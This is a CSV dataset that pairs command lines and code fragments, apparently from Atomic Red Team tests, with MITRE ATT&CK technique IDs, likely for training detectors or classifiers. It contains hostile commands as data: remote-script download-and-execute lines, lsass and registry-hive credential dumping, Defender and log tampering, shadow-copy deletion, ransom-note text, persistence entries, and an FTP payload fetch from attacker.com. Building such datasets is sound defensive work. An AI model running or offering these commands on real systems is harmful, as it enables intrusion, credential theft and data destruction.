command,mitre_id
dseditgroup -o edit -a art-user -t user admin,T1078
copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll,T1574
truncate -s +1 $file_to_pad #adds a byte to the file size,T1027
} catch [System.UnauthorizedAccessException] {,T1083
ECHO Let's open the Computer Management console now...,T1053
"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi;",T1069
RtlGetVersion,T1082
kl.ps1,T1056
IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd ),T1546
"wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\""ATOMICREDTEAM\""",T1562
foreach($queue in $queues) {,T1619
taskkill /im notepad.exe /t /f > NUL 2>&1,T1546
echo '' >> $rc_service_path/$rc_service_file,T1543
HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System,T1012
printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common,T1037
0xAA,T1027
"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'",T1546
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt},T1105
~/Library/Cookies/Cookies.binarycookies,T1539
unlink,T1070
Info.plist,T1547
Stop-Process -ID $myT1036_003,T1036
"ContainerName = """"",T1619
New-VM -Name $VM -Generation 2,T1564
"PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""$output_folder""",T1003
samfile -consoleoutput -noninteractive,T1003
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose,T1482
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid,T1082
Profile,T1083
Nt*,T1106
CreateCompatibleDC,T1113
"Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup",T1574
Remove-MailboxExportRequest,T1070
msiexec /y {PATH_ABSOLUTE:.dll},T1218
"powershell.exe /c ""Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }""",T1518
"hh.exe -decompile %temp% ""$local_chm_file""",T1218
pktmon.exe stop,T1040
Write-Host -ForegroundColor Green $result,T1016
C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\,T1074
/Library/Keychains/login.keychain,T1555
reg save HKLM\security %temp%\security,T1003
rm -rf,T1070
PnPUtil.exe,T1543
net start >> %temp%\download,T1007
/dev/random,T1546
if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi,T1048
sudo chmod u+xs $file_to_setuid,T1548
NPLogonNotify(),T1556
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1""",T1059
net.exe user $user_account /delete,T1531
WoodyPowerSession,T1059
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",T1218
"echo $ENCODED | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())""",T1140
C:\Windows\Microsoft.NET\,T1083
"Move-Item -Path ""C:\Windows\System32\termsrv_backup.dll"" -Destination ""C:\Windows\System32\termsrv.dll"" -Force -ErrorAction Ignore",T1505
Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath $chm_file_path,T1218
"grep -E ""^[0-9a-f-]* r"" /proc/""$pid""/maps | cut -d' ' -f 1",T1003
"""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js""",T1027
"Write-Host ""The registry value '$registryValue' does not exist, temporarily creating it.""",T1137
"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -preTraceCmd {PATH:.exe}",T1202
"& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" asktgs /service:cifs/$target /ticket:ticket.kirbi /ptt",T1550
"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",T1218
stordiag.exe,T1218
text/plain,T1027
"$sheet.Cells.Item(5,1) = ""=FOPEN(`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"", 3)""",T1204
schtasks.exe,T1053
net view /all /domain,T1016
"Write-Host ""`nCertificates retrieved successfully""",T1552
OutputDebugStringW(),T1622
init.d,T1037
"echo ""runnning some commands to populate the history""",T1562
printf 'exit 0' | sudo tee -a /etc/rc.local,T1037
ls -l@,T1564
"""$procdump_exe"" -accepteula -ma lsass.exe $output_file",T1003
"Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp",T1574
printf $ENCODED | b64decode -r,T1140
"), globing (",T1027
echo $HISTFILE,T1562
/tmp,T1027
type,T1140
"echo ""3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data."" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
/etc/hosts,T1018
"if [ -f /tmp/atomic_hook_poc.txt ]; then echo ""[+] Success: atomic_hook_poc.txt created under /tmp \n"" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo ""Failed: /tmp/atomic_hook_poc.txt not found""; fi",T1546
"& ""$sharphound_path"" -d ""$domain"" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory ""$output_path""",T1069
"echo ""Description=Atomic Red Team Systemd Timer Service"" >> $path_to_systemd_service",T1053
powershell.exe iwr -URI $remote_file -Outfile $local_path,T1105
continue,T1562
ConsoleHost_history.txt,T1070
"ls ""$env:TEMP\$target_hivevss$_"" -ErrorAction Ignore",T1003
ShellExecuteA,T1106
mkdir ~/Library/Mail/copy,T1070
Get-AdComputer -Filter *,T1018
com.apple.softwareupdate.plist,T1543
"find / -path ""*/.config/chromium/*/Bookmarks"" -exec echo {} >> $output_file \;",T1217
GetFileAttributesA,T1106
"echo ""ExecStart=/bin/touch /tmp/art-systemd-timer-marker"" >> $path_to_systemd_service",T1053
-ErrorAction SilentlyContinue,T1564
New-Item -Path $datePath -ItemType Directory,T1105
openssl enc $encryption_option -in $input_file_path -out $output_file_name,T1486
"New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null",T1574
forfiles.exe,T1202
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi,T1219
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'),T1555
fsutil usn deletejournal /D C:,T1070
cdb.exe,T1546
"$tcp.ConnectAsync($ip, $port).Wait($timeout_ms) | Out-Null",T1046
bcdedit.exe -set TESTSIGNING ON,T1553
systemctl start,T1569
MsMpEng.exe,T1574
provider = AWS,T1567
ProgramData\Microsoft\PlayReady,T1036
system_profiler,T1082
./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force,T1562
.conf,T1037
HKCU\Software\Classes\ms-settings\shell\open\command,T1548
"schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st $time",T1053
<LogonCommand>,T1564
net group “Exchange Trusted Subsystem” /domain,T1087
"for /f ""usebackq delims=?"" %i in ($file_name:$ads_filename) do %i",T1564
rpcping -s $server_ip -e $custom_port -a privacy -u NTLM 1>$Null,T1003
"Write-Host ""Successfully Renamed $account Account on "" $Env:COMPUTERNAME",T1098
HKLM\SECURITY\Policy\Secrets\*\CurrVal,T1003
"curl -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 $domain",T1071
FAX,T1007
Write-Host HaHa_$x$y$z,T1098
HKCU\Software\Classes\mscfile\shell\open\command,T1574
0x1d0,T1027
/tmp/data/root/dev,T1083
$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug,T1055
"New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32' -Value ""$dllpath""",T1546
"Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -File | ForEach-Object { Add-Content -Path $_.FullName -Value ""Modification for Atomic Red Test"" -ErrorAction Ignore }",T1070
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f",T1112
State = $_.State,T1049
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort $NEW_Remote_Port,T1021
Get-SiteListPassword,T1552
"echo ""id"" > $TMPFILE",T1059
"Write-Host "" [-] Attempting $password on account ${user}.""",T1110
wsl.exe,T1218
"Copy-Item ""C:\Program Files (x86)\KeyScrambler\KeyScrambler.exe"" -Destination $env:TEMP\KeyScrambler.exe",T1574
HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName,T1012
cmd.exe /Q /c $command_to_execute 1> \\127.0.0.1\ADMIN$\$output_file 2>&1,T1021
public long Luid;,T1562
March 25 \u202Excod.scr,T1036
touch -m -t 197001010000.00 $target_filename,T1070
%SystemRoot%\NTDS\Ntds.dit,T1003
Import-Module AADInternals -Force | Out-Null,T1552
cmd.exe /c ipconfig /all,T1016
CreateProcessAsUserW,T1134
C:\Users\Public,T1074
%USERPROFILE%\AppData\Local\SKC\,T1074
"su -c ""cd /tmp; curl -s $remote_url | bash"" art",T1110
GetKeyNameText,T1056
su art,T1078
echo '$text_to_append' >> ~/.profile,T1546
RegisterModule,T1505
AppDomainManager,T1574
Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0,T1016
http[:]//169.254.169.254,T1552
net sessions 2>nul,T1049
Get-ApplicationHost,T1552
NetUserDel,T1106
wevtutil cl security,T1070
"CommandLineTemplate=""$($Env:SystemRoot)\System32\notepad.exe"";}",T1546
"rundll32.exe shell32.dll,#44 {PATH:.dll}",T1218
echo 1> /proc/sys/kernel/sysrq,T1562
"sudo sh -c ""echo Defaults ""'!'""tty_tickets >> /usr/local/etc/sudoers""",T1548
if [ -d /var/audit ] ; then sudo rm -rf $macos_audit_path ; fi,T1070
Get-MpThreat #threats details that have been detected using MS Defender,T1518
dir \\$($domaincontroller)\SYSVOL,T1558
"ldapsearch -H ldap://$domain.$top_level_domain:389 -x -D $user -w $password -b ""CN=Users,DC=$domain,DC=$top_level_domain"" -s sub -a always -z 1000 dn",T1087
"zip --password ""$encryption_password"" $test_folder/$test_file ./*",T1560
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableBehaviorMonitoring"" -Value 1",T1562
usermod --password $(openssl passwd -1 nobody) nobody,T1078
systemctl start T1543.002,T1543
$AuthenticationPackagesValues += $passwordFilterName,T1556
chown root /tmp/hello.c,T1548
bcdedit.exe /set {default} recoveryenabled no,T1490
cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\temp\sys.tmp1 CSIDL_WINDOWS\policydefinitions\postgresql.exe 1> \\127.0.0.1\ADMIN$\_1636727589.6007507 2>&1,T1059
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,T1218
"cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*""",T1105
amsiPatch.py,T1562
"wmic OS get Caption,OSArchitecture,Version",T1082
C:\Users\Public\WinTN\WinTN.exe,T1105
"Write-Output ""Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...""",T1530
"echo ""$command"" >> /var/spool/cron/crontabs/$cron_script_name",T1053
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f",T1562
"Start-Process ""$PathToAtomicsFolder\T1055.003\bin\InjectContext.exe""",T1055
%SystemRoot%\System32\Wbem\Repository,T1027
InstallUtil.exe {REMOTEURL},T1105
if (Test-Path $Copy) { Remove-Item $Copy -Recurse -Force },T1560
"} elseif ($ipAddr -notlike ""*,*"") {",T1046
testcat /etc/passwd,T1003
netsh.exe firewall show state,T1518
DeleteSnapshots,T1490
SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,T1547
main(),T1036
"New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application -Name Start -Value 0 -PropertyType ""DWord"" -Force",T1562
SetFile -m $target_date $target_filename,T1070
"$excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"")",T1137
"""$psexec_exe"" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y",T1003
vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:,T1202
sudo launchctl load -w ~/Library/LaunchAgents/$plist_filename,T1543
/usr/bin/sw_vers -productVersion,T1082
P_TRACED,T1622
"expand ""$cab_path"" -F:* .",T1140
"tasklist.exe | findstr /i ""virus cb defender cylance mc""",T1518
“%AppData%\{Unique Identifier}\HOSTRURKLSR”,T1074
"cmd.exe /c ping.exe 8.8.8.8 -n 70&&""%temp%\FontEDL.exe""",T1059
[kworker\/0:1],T1036
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},T1567
echo $bash_encoded | b64decode -r | sh,T1140
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $computer_name -Verbose,T1069
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$target_binary"" /v ReportingMode /t REG_DWORD /d 1",T1546
"get-process | ?{$_.ProcessName -like ""*mc*""}",T1518
net time \\ip/hostname,T1124
CrashReporter.exe,T1036
"""$gup_executable""",T1574
Update.exe --updateRollback={REMOTEURL},T1218
Windows Time Service,T1036
~/Desktop,T1560
cd C:\Users\Public\Temp\,T1569
net stop w32time,T1547
"cmd.exe /c netsh firewall add portopening TCP 443 ""adp""",T1090
Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile $extract_path\SYSTEM_HIVE,T1003
echo T1222.001_attrib1 >> $file_or_folder\T1222.001_attrib1.txt,T1222
Disconnect-VIServer -Confirm:$false,T1562
CreateServiceW(),T1543
reg add HKCU\SOFTWARE\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f,T1112
"usermod --expiredate ""99999"" art",T1078
"& ""$pua_file""",T1204
"Get-ChildItem | Where-Object {$_ -like ""ADFS*""}",T1552
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t,T1546
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use,T1059
"echo ""WantedBy=multi-user.target"" >> $path_to_systemd_service",T1053
"echo ""Requires=$systemd_service_name"" >> $path_to_systemd_timer",T1053
wab.exe,T1218
launchd,T1547
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue,T1547
Set-InboxRule,T1564
winprint.dll,T1036
"copy ""$exe_path"" %temp%\T1036.007_masquerading.pdf.exe /Y",T1036
Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap,T1112
gcloud iam service-accounts list,T1087
Invoke-ATHCompiledHelp -InfoTechStorageHandler $infotech_storage_handler -HHFilePath $hh_file_path -CHMFilePath $chm_file_path,T1218
"if (!(Test-Path -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"")){",T1547
"Write-Host ""Downloading latest EDR-Freeze from $downloadUrl"" -ForegroundColor Cyan",T1562
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt,T1552
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",T1105
"New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""$file_name"" -Force | Out-Null",T1574
sudo chmod u+s /tmp/hello,T1548
"Write-Host ""User: $($owner.Domain)\$($owner.User)""",T1562
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run,T1060
"windows\syswow64,",T1053
Microsoft Windows DeviceSync Service,T1543
"echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\silver.bat"" | Out-Null",T1558
"mavinject $pid /INJECTRUNNING ""$file_name""",T1056
ptrace,T1622
unlink /var/log/messages,T1070
"sc create VBoxDRV binpath= ""C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys"" type= kernel start= auto error= normal displayname= PortableVBoxDRV",T1564
.wll,T1036
"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",T1218
New-Item -ItemType Directory -Path $containerFolderPath,T1530
"net user /add ""$username"" ""$password""",T1136
Import-Module MSOnline,T1098
"""$procdump_exe"" -accepteula -mm lsass.exe $output_file",T1003
/etc/sudoers,T1548
SCHTASKS /Change,T1036
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f,T1112
catch { $_; exit $_.Exception.HResult },T1018
cat $bash_history_filename | grep $bash_history_grep_args > $output_file,T1552
sudo cp $path_malicious_plist /tmp/T1037_005_agent.plist,T1037
esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o,T1564
companycatalogue,T1036
certutil -encode {PATH} {PATH:.base64},T1027
auditpol /remove /allusers,T1562
kill,T1070
ExecStop,T1543
"[ ""$(uname)"" = 'FreeBSD' ] && sysrc tor_enable=""YES"" && service tor start || sudo systemctl start tor",T1090
"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers",T1548
"Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter ""Name = 'svchost.exe' AND CommandLine LIKE '%'"" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $file_path -CommandLine '$command_line'",T1134
"echo ""import subprocess; subprocess.Popen(['open', '-a', '$exe_name'])"" > ""$SITE_PACKAGES/atomic_hook.pth""",T1546
C:\ProgramData\Adobe\temp,T1074
%TEMP%\\svjhost.exe,T1036
"vaultcmd /listcreds:""Web Credentials"" /all",T1555
sudo cp $path_malicious_plist /tmp/T1037_005_daemon.plist,T1037
IActiveScriptParseProcedure32,T1012
GetLocaleInfoA,T1614
"$sheet.Cells.Item(6,1) = ""=FWRITELN(A5, `""url = `""`""$download_url`""`""`"")""",T1204
"Write-Host ""Generating rclone config... "" -NoNewLine",T1567
Sub AutoExec(),T1137
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem,T1134
LD_PRELOAD,T1574
netstat -ano,T1049
SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfileGloballyOpenPorts\\List,T1112
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART))),T1059
fsinfo,T1082
sudo setcap cap_setuid=ep /tmp/cap,T1548
ssh,T1070
"Write-Output ""Download original function code failed.""",T1528
"echo ""import os; os.system('date > /tmp/poc.txt')"" > ""$USER_PACKAGES/usercustomize.py""",T1546
sc stop,T1569
net localgroup,T1069
"copy ""$exe_path"" %temp%\T1036.007_masquerading.docx.exe /Y",T1036
RegQueryValueExA,T1012
"""Response received for $base_name.blob.core.windows.net/$container_name/$blob_name: $responsebody"" | out-file -filepath $output_file -append",T1619
GetWindowsDirectoryW,T1106
". ""$gpp_script_path""",T1552
copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll,T1574
"echo ""# THIS IS A COMMENT"" >> /etc/ufw/sysctl.conf",T1562
GetSystemTime,T1124
HTTP_X_CMD.,T1071
"function Invoke-dpsLight ($Password, $userlist) {",T1110
ls -la ~/Library/Application\ Support/MobileSync/Backup/,T1083
Disconnect-ExchangeOnline -Confirm:$false,T1098
"reg add ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f",T1113
"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",T1218
".\kerbrute.exe passwordspray --dc $domaincontroller -d $domain ""PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"" password132",T1110
dir c:\\,T1083
wbemtool.exe,T1047
WinEggDrop,T1046
"echo ""[Service]"" >> $systemd_service_path/$systemd_service_file",T1543
Set-ItemProperty -Force -Path $registry_key_storage -Name $registry_entry_storage -Value $EncodedCommand,T1027
net stop <process>,T1489
curl -k $ip_lookup_url,T1614
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'),T1558
com.apple.quarantineattribute,T1553
~/Library/LaunchAgents,T1543
CreateProcess,T1546
kittenz -consoleoutput -noninteractive,T1555
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\AtBroker.exe,T1546
"& ""$python_exe"" -m venv ""$TempDir\env""",T1546
[PSCustomObject]@{,T1007
"su -l art -c ""echo 'echo \""Atomic Red Team was here... T1546.004\"" >> /home/art/art.txt' >> /home/art/.bash_logout; exit""",T1546
findstr /S cpassword %logonserver%\sysvol\*.xml,T1552
vssadmin.exe delete shadows /all /quiet,T1490
patch.dll,T1036
"sc start ""Example Service""",T1574
"echo '! exec ""/bin/sh &""' | PERL_MM_USE_DEFAULT=1 cpan",T1059
HKCU\Software\Microsoft\Windows\Current Version\Run,T1547
/var/log/kern.log,T1070
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe,T1546
"REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""$command_to_execute""",T1547
chflags simmutable $file_to_modify,T1222
GetDriveType,T1680
"New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" -Force",T1547
echo $ENCODED > $encoded_file && cat < $encoded_file | xxd -r -p,T1140
vssadmin.exe,T1490
Process List,T1057
esxcli system syslog config set,T1562
copy C:\Windows\System32\cmd.exe C:\svchost.exe,T1105
"su art -c ""whoami; exit""",T1078
safedump -consoleoutput -noninteractive,T1078
"Add-MsolRoleMember -RoleName ""Global Reader"" -RoleMemberEmailAddress ""$target_user""",T1098
SeTakeOwnershipPrivilege,T1106
[System.Collections.ArrayList]$selectUsers = @(),T1114
useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art,T1110
ls -la $HISTFILE,T1562
tasklist.exe | findstr /i mc,T1518
"reg add ""HKLM\SOFTWARE\Microsoft\Terminal Server Client"" /v ClxDllPath /t REG_SZ /d ""$dll_inf"" /f",T1546
"echo """" >> $systemd_service_path/$systemd_service_file",T1543
attrib.exe,T1564
"net group ""domain admins"" /dom",T1069
RunPe6,T1055
HKLM\SOFTWARE\Microsoft\Print\Components\,T1027
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f",T1112
getST.py,T1558
cat /etc/group,T1069
"Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Active Setup\Installed Components""",T1012
$totalopen++ | Out-Null,T1016
.lua,T1059
cp $cert_filename /etc/pki/ca-trust/source/anchors/,T1553
"$storageAccountObjects | Export-Csv -Path ""$output_file"" -NoTypeInformation",T1619
"$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, ""Closing"", [System.Threading.CancellationToken]::None).Wait()",T1539
ie4uinit.exe -BaseSettings,T1218
"Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"" -OutFile ""$settings_json_def""",T1547
write-warning $cred.GetNetworkCredential().Password,T1056
"& ""$mimikatz_path"" ""privilege::debug"" ""misc::skeleton"" ""exit""",T1556
if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;,T1497
Win32_BIOS,T1082
dlopen,T1129
"grep ""# THIS IS A COMMENT"" /etc/ufw/ufw.conf",T1562
Common.Compress,T1560
HKLM\SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest,T1112
attrib +h “C:\ProgramData\ssh”,T1564
Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value '1' -ErrorAction Ignore,T1112
"$which_python -c 'import py_compile; py_compile.compile(""$python_script_name"", ""$python_binary_name"")'",T1059
dism.exe /online /Get-Intl,T1614
pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd',T1518
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*,T1003
"Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""",T1547
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f",T1546
C:\Windows,T1053
update.exe,T1036
"echo ""1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/."" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
LoadLibrary,T1129
SetThreadToken,T1134
IPC$,T1021
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 2",T1559
netstat -anpo tcp,T1049
winget.exe install --accept-package-agreements -s msstore {name or ID},T1105
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\$weak_service_name |FL,T1574
dfrgui.exe,T1057
"msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=""{CMD}""",T1218
partner,T1548
SELECT volumeserialnumber FROM win32_logicaldisk where Name =’C:,T1680
sudo launchctl unload $userdaemon_plist,T1562
wmiexec.py,T1047
winmgmts:\\.\root\SecurityCenter2,T1518
Scan-AzureAdmins -UseCurrentCred,T1082
systemctl enable,T1569
version.dll,T1574
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""",T1127
"timestomp -dest ""$file_path\kxwn.lock""",T1070
"pushd ""$output_dir""",T1140
diskshadow> exec {PATH:.exe},T1202
"echo ""This file will be encrypted"" > .\encrypted_file.txt",T1560
system.bat,T1070
